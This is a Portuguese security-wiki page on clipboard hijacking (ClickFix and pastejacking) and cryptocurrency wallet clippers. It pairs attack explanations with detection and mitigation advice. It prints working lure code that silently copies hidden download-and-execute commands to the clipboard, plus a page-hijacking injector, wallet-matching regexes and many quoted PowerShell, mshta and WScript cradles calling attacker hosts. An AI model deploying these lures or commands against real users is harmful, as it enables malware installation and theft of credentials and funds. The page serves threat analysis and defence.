# Ataques de Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Nunca cole algo que você mesmo não copiou." – conselho antigo, mas ainda válido

## Visão geral

Clipboard hijacking – também conhecido como *pastejacking* – explora o fato de que os usuários costumam copiar e colar comandos sem inspecioná-los. Uma página maliciosa (ou qualquer contexto capaz de executar JavaScript, como um aplicativo Electron ou Desktop) coloca programaticamente texto controlado pelo atacante na área de transferência do sistema. As vítimas são incentivadas, normalmente por instruções de engenharia social cuidadosamente elaboradas, a pressionar **Win + R** (caixa de diálogo Executar), **Win + X** (Acesso rápido / PowerShell) ou abrir um terminal e *colar* o conteúdo da área de transferência, executando comandos arbitrários imediatamente.

Como **nenhum arquivo é baixado e nenhum anexo é aberto**, a técnica contorna a maioria dos controles de segurança de e-mail e conteúdo da Web que monitoram anexos, macros ou execução direta de comandos. Por isso, o ataque é popular em campanhas de phishing que distribuem famílias de malware commodity, como NetSupport RAT, Latrodectus loader ou Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers que substituem endereços de carteiras

Outra variante de **clipboard hijacking** não cola comandos: ela espera até que a vítima copie um **endereço de carteira de criptomoeda** e, em seguida, o substitui silenciosamente por um endereço controlado pelo atacante, pouco antes de ser colado. Isso é especialmente eficaz com formatos longos de carteira, pois os usuários costumam verificar apenas os primeiros e os últimos caracteres.<sup>[[8]](#references)</sup>

Características comuns observadas em ataques reais:
- **Loader pequeno + payload aninhado**: o aplicativo/exe visível parece uma ferramenta legítima de trading ou de "lucro", enquanto o clipper verdadeiro fica escondido em camadas mais profundas do pacote (por exemplo, um loader .NET que inicia um payload Rust aninhado).
- **Substituição baseada em regex**: o malware identifica strings como `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` ou até strings genéricas de **44 caracteres semelhantes às da Solana**, e as substitui por carteiras do atacante.
- **Rotação de carteiras em grande escala**: amostras modernas para Windows podem incluir **milhares** de carteiras substitutas por criptomoeda, em vez de um único endereço estático, reduzindo o desgaste da reputação da carteira após cada roubo.<sup>[[8]](#references)</sup>

### Fluxo de um clipper no Windows

Uma implementação comum usa uma janela oculta registrada com **`AddClipboardFormatListener`**. A cada atualização da área de transferência, o malware normalmente chama:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → acessa os dados atuais da área de transferência.
- **`GetClipboardData`** → lê o texto.
- **`EmptyClipboard`** + **`SetClipboardData`** → substitui a string da carteira pelo valor do atacante.

Expressões regex mínimas frequentemente encontradas em clippers:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

A persistência em nível de usuário é suficiente para causar impacto. Um padrão observado é:<sup>[[8]](#references)</sup>
- Copiar o payload para **`%APPDATA%\silke\silke.exe`**
- Criar um **LNK na pasta Inicialização** em `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideias para detecção:
- Processos que chamam APIs da área de transferência continuamente enquanto também gravam em `%APPDATA%` e na pasta **Startup** do usuário.
- Criação de novos LNK/executáveis seguida por alterações no endereço da wallet na área de transferência.
- Arquivos compactados ou pacotes de software falso contendo muitos arquivos não utilizados e um pequeno launcher que inicia um binário aninhado.

### Remoção de quarentena por engenharia social no macOS + persistência com LaunchAgent

No macOS, algumas campanhas distribuem um auxiliar **`unlocker.command`** e instruem a vítima a clicar com o botão direito → **Abrir** se o Gatekeeper disser que o app está danificado ou é de um desenvolvedor não identificado. O script simplesmente remove a quarentena e inicia o `.app` próximo:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Isto **não** é um exploit do Gatekeeper; é um **bypass de quarentena por engenharia social** que explora o fato de que as decisões do Gatekeeper dependem do xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Após a execução, o clipper pode persistir como usuário atual gravando:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent com `RunAtLoad` e `KeepAlive`

Um detalhe útil para a defesa é que algumas amostras implementam um **watchdog autorrecuperável** que regrava o LaunchAgent e o wrapper a cada ~30 segundos. Se você remover primeiro o plist **sem encerrar o processo em execução**, o malware poderá recriá-lo imediatamente.<sup>[[8]](#references)</sup> Ordem segura de limpeza:
1. Encerre o processo ativo do clipper.
2. Descarregue/exclua o plist do LaunchAgent.
3. Exclua `~/launch.sh` e o payload copiado.

### Nota sobre a entrega: reputação falsa como multiplicador de força

Para essa família, o malware pode ser tecnicamente simples, enquanto a **camada de distribuição** faz o trabalho pesado: estrelas/forks falsos no GitHub, avaliações/downloads no SourceForge, comentários/visualizações em tutoriais no YouTube e comentários/votos aparentemente benignos no VirusTotal são usados para fazer o binário parecer confiável antes da execução.<sup>[[8]](#references)</sup>

## Botões de cópia forçada e payloads ocultos (comandos de uma linha no macOS)

Alguns infostealers para macOS clonam sites de instalação (por exemplo, o Homebrew) e **forçam o uso de um botão “Copy”** para impedir que os usuários selecionem apenas o texto visível. A entrada da área de transferência contém o comando de instalação esperado mais um payload Base64 anexado (por exemplo, `...; echo <b64> | base64 -d | sh`), então uma única colagem executa ambos, enquanto a interface oculta a etapa extra.<sup>[[5]](#references)</sup>

## Prova de Conceito em JavaScript

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Campanhas mais antigas usavam `document.execCommand('copy')`; as mais recentes dependem da **Clipboard API** assíncrona (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## O fluxo ClickFix / ClearFake

1. O usuário acessa um site com typosquatting ou comprometido (por exemplo, `docusign.sa[.]com`)
2. O JavaScript **ClearFake** injetado chama um helper `unsecuredCopyToClipboard()` que armazena silenciosamente no clipboard um one-liner do PowerShell codificado em Base64.
3. Instruções HTML dizem à vítima: *“Pressione **Win + R**, cole o comando e pressione Enter para resolver o problema.”*
4. `powershell.exe` é executado, baixando um arquivo compactado que contém um executável legítimo e uma DLL maliciosa (DLL sideloading clássico).
5. O loader descriptografa estágios adicionais, injeta shellcode e instala persistência (por exemplo, uma tarefa agendada) – executando, por fim, NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Exemplo de cadeia do NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (Java WebStart legítimo) procura `msvcp140.dll` em seu diretório.
* A DLL maliciosa resolve APIs dinamicamente com **GetProcAddress**, baixa dois binários (`data_3.bin`, `data_4.bin`) usando **curl.exe**, descriptografa-os com uma chave XOR rotativa `"https://google.com/"`, injeta o shellcode final e extrai **client32.exe** (NetSupport RAT) em `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Baixa `la.txt` com **curl.exe**
2. Executa o downloader em JScript dentro de **cscript.exe**
3. Obtém um payload MSI → solta `libcef.dll` ao lado de um aplicativo assinado → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

A chamada **mshta** inicia um script PowerShell oculto que baixa `PartyContinued.exe`, extrai `Boat.pst` (CAB), reconstrói `AutoIt3.exe` usando `extrac32` e concatenação de arquivos e, por fim, executa um script `.a3x` que exfiltra credenciais do navegador para `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Área de transferência → PowerShell → avaliação de JS → LNK de inicialização com C2 rotativo (PureHVNC)

Algumas campanhas ClickFix ignoram completamente o download de arquivos e instruem as vítimas a colar uma linha única que baixa e executa JavaScript via WSH, estabelece persistência e alterna o C2 diariamente. Exemplo de cadeia observada:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Características principais
- URL ofuscada invertida em runtime para evitar inspeções superficiais.
- JavaScript persiste por meio de um LNK de Startup (WScript/CScript) e seleciona o C2 de acordo com o dia atual, permitindo uma rápida rotação de domínios.<sup>[[3]](#references)</sup>

Fragmento mínimo de JS usado para alternar C2s por data:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

A próxima etapa geralmente implanta um loader que estabelece persistência e baixa um RAT (por exemplo, PureHVNC), frequentemente fixando o TLS a um certificado codificado e dividindo o tráfego em blocos.<sup>[[3]](#references)</sup>

Ideias de detecção específicas desta variante
- Árvore de processos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ou `cscript.exe`).
- Artefatos de inicialização: LNK em `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` que invoca WScript/CScript com um caminho para um arquivo JS em `%TEMP%`/`%APPDATA%`.
- Telemetria do Registro/RunMRU e da linha de comando contendo `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Execuções repetidas de `powershell -NoProfile -NonInteractive -Command -` com grandes payloads no stdin para fornecer scripts longos sem linhas de comando extensas.
- Tarefas agendadas que posteriormente executam LOLBins, como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, sob uma tarefa/caminho que aparenta ser de um atualizador (por exemplo, `\GoogleSystem\GoogleUpdater`).

Caça a ameaças
- Nomes de host e URLs de C2 rotacionados diariamente no padrão `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacione eventos de gravação na área de transferência seguidos de colar com Win+R e execução imediata de `powershell.exe`.

As equipes blue team podem combinar a telemetria da área de transferência, de criação de processos e do Registro para identificar abusos de pastejacking:

* Registro do Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantém um histórico dos comandos **Win + R** — procure entradas incomuns em Base64 ou ofuscadas.
* Evento de Segurança ID **4688** (Criação de Processo) em que `ParentImage` == `explorer.exe` e `NewProcessName` pertence a { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Evento ID **4663** para criações de arquivos em `%LocalAppData%\Microsoft\Windows\WinX\` ou em pastas temporárias, imediatamente antes do evento 4688 suspeito.
* Sensores de área de transferência do EDR (se disponíveis) — correlacione `Clipboard Write` seguido imediatamente por um novo processo do PowerShell.

## Páginas de verificação no estilo IUAM (ClickFix Generator): cópia da área de transferência para o console + payloads adaptados ao SO

Campanhas recentes produzem em massa páginas falsas de verificação de CDN/navegador ("Just a moment…", no estilo IUAM) que induzem os usuários a copiar comandos específicos do SO da área de transferência para consoles nativos. Isso transfere a execução para fora do sandbox do navegador e funciona no Windows e no macOS.<sup>[[4]](#references)</sup>

Características principais das páginas geradas pelo builder
- Detecção do SO por meio de `navigator.userAgent` para adaptar os payloads (PowerShell/CMD no Windows versus Terminal no macOS). Chamadores/no-ops opcionais para SOs não compatíveis mantêm a ilusão.
- Cópia automática para a área de transferência em ações benignas da interface (caixa de seleção/Copiar), embora o texto visível possa ser diferente do conteúdo da área de transferência.
- Bloqueio de dispositivos móveis e um popover com instruções passo a passo: Windows → Win+R→colar→Enter; macOS → abrir o Terminal→colar→Enter.
- Ofuscação opcional e injector de arquivo único para substituir o DOM de um site comprometido por uma interface de verificação estilizada com Tailwind (sem necessidade de registrar um novo domínio).<sup>[[4]](#references)</sup>

Exemplo: divergência no conteúdo da área de transferência + ramificação adaptada ao SO
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Persistência do macOS na execução inicial
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que a execução continue após o fechamento do terminal, reduzindo artefatos visíveis.<sup>[[4]](#references)</sup>

Sequestro de página no próprio local em sites comprometidos
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Ideias de detecção e hunting específicas para lures no estilo IUAM
- Web: páginas que vinculam a Clipboard API a widgets de verificação; divergência entre o texto exibido e o conteúdo da clipboard; ramificações com `navigator.userAgent`; Tailwind + substituição de página única em contextos suspeitos.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` logo após uma interação com o navegador; instaladores batch/MSI executados de `%TEMP%`.
- Endpoint macOS: Terminal/iTerm iniciando `bash`/`curl`/`base64 -d` com `nohup` próximo a eventos do navegador; jobs em segundo plano que continuam após o fechamento do terminal.
- Correlacione o histórico do Win+R em `RunMRU` e as gravações na clipboard com a criação subsequente de processos de console.

Veja também técnicas relacionadas

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evoluções de fake CAPTCHA / ClickFix em 2026 (ClearFake, Scarlet Goldfinch)

- ClearFake continua comprometendo sites WordPress e injetando JavaScript loader que encadeia hosts externos (Cloudflare Workers, GitHub/jsDelivr) e até chamadas de blockchain “etherhiding” (por exemplo, POSTs para endpoints da API da Binance Smart Chain, como `bsc-testnet.drpc[.]org`) para buscar a lógica atual dos lures. Overlays recentes usam amplamente fake CAPTCHAs que instruem os usuários a copiar/colar uma one-liner (T1204.004), em vez de baixar qualquer coisa.<sup>[[6]](#references)</sup>
- A execução inicial está sendo cada vez mais delegada a hosts de scripts assinados/LOLBAS. Em janeiro de 2026, as cadeias trocaram o uso anterior de `mshta` pelo `SyncAppvPublishingServer.vbs` integrado, executado via `WScript.exe`, passando argumentos semelhantes aos do PowerShell com aliases/wildcards para buscar conteúdo remoto:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` é assinado e normalmente usado pelo App-V; combinado com `WScript.exe` e argumentos incomuns (aliases `gal`/`gcm`, cmdlets com curingas, URLs do jsDelivr), torna-se um estágio LOLBAS de alto sinal para ClearFake.<sup>[[6]](#references)</sup>
- Em fevereiro de 2026, payloads de CAPTCHA falso voltaram a usar download cradles puramente em PowerShell. Dois exemplos ativos:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - A primeira cadeia é um grabber em memória `iex(irm ...)`; a segunda prepara o estágio usando `WinHttp.WinHttpRequest.5.1`, grava um arquivo `.ps1` temporário e depois o inicia com `-ep bypass` em uma janela oculta.<sup>[[6]](#references)</sup>

Dicas de detecção e hunting para essas variantes
- Linhagem de processos: navegador → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ou cradles do PowerShell logo após gravações na área de transferência/Win+R.
- Palavras-chave da linha de comando: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domínios do jsDelivr/GitHub/Cloudflare Worker ou padrões `iex(irm ...)` com IPs brutos.
- Rede: conexões de saída para hosts de CDN worker ou endpoints de blockchain RPC a partir de hosts de script/PowerShell logo após a navegação na web.
- Arquivos/registro: criação de `.ps1` temporários em `%TEMP%` e entradas RunMRU contendo esses comandos de uma linha; bloqueie/alerte sobre LOLBAS de scripts assinados (WScript/cscript/mshta) executados com URLs externas ou strings de alias ofuscadas.

## Práticas de ClickFix em junho de 2026: telemetria de colagem, comentários falsos de verificação e encadeamento de LOLBin

A telemetria recente da Red Canary mostra que o indicador estável **não é um comando específico**, mas a combinação de **colar e executar com ajuda do usuário**, **interpretadores/LOLBins confiáveis**, **flags ofuscadas**, **recuperação remota** e **execução imediata**.<sup>[[7]](#references)</sup>

### Padrões notáveis dos operadores

- **Telemetria de confirmação da colagem**: alguns payloads chamam `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` antes do estágio real. Isso confirma a interação do usuário, mantendo a janela curta e discreta.
- **Comentários falsos de verificação**: comandos de uma linha do PowerShell podem acrescentar strings como `# Security check ✔️ I'm not a robot Verification ID: 138105`, para que o comando continue parecendo relacionado a CAPTCHA depois de ser colado no histórico de Executar / `cmd.exe` / PowerShell.
- **Reconstrução dinâmica de URL**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` evita uma URL estática na linha de comando, mas ainda realiza o download e a execução em memória.
- **Execução de instalador disfarçado**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abusa de capitalização incomum e caracteres semelhantes a Unicode nas flags para contornar detecções frágeis, mas ainda se parecer com `msiexec.exe`.
- **Cadeias de LOLBin com escape de circunflexo**: `cmd.exe` pode ocultar palavras-chave com escapes `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), iniciar o shell aninhado minimizado, salvar conteúdo do atacante com uma extensão inofensiva como `.pdf` e então executá-lo por meio do `mshta`.<sup>[[7]](#references)</sup>
## Mitigações

1. Reforço do navegador – desative o acesso de gravação à área de transferência (`dom.events.asyncClipboard.clipboardItem` etc.) ou exija um gesto do usuário.
2. Conscientização sobre segurança – ensine os usuários a *digitar* comandos sensíveis ou colá-los primeiro em um editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear comandos arbitrários de uma linha.
4. Controles de rede – bloqueie conexões de saída para domínios conhecidos de pastejacking e malware C2.

## Truques relacionados

* **Discord Invite Hijacking** costuma abusar da mesma abordagem ClickFix depois de atrair usuários para um servidor malicioso:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Corrija o clique: prevenção do vetor de ataque ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC de Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Sob a cortina pura: de RAT a builder e coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [A fábrica ClickFix: primeira exposição do gerador IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, o ano do infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Insights de inteligência: fevereiro de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Insights de inteligência: junho de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – De estrelas a votos positivos: reputação falsa alimentando um hijacker de clipboard de cripto](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
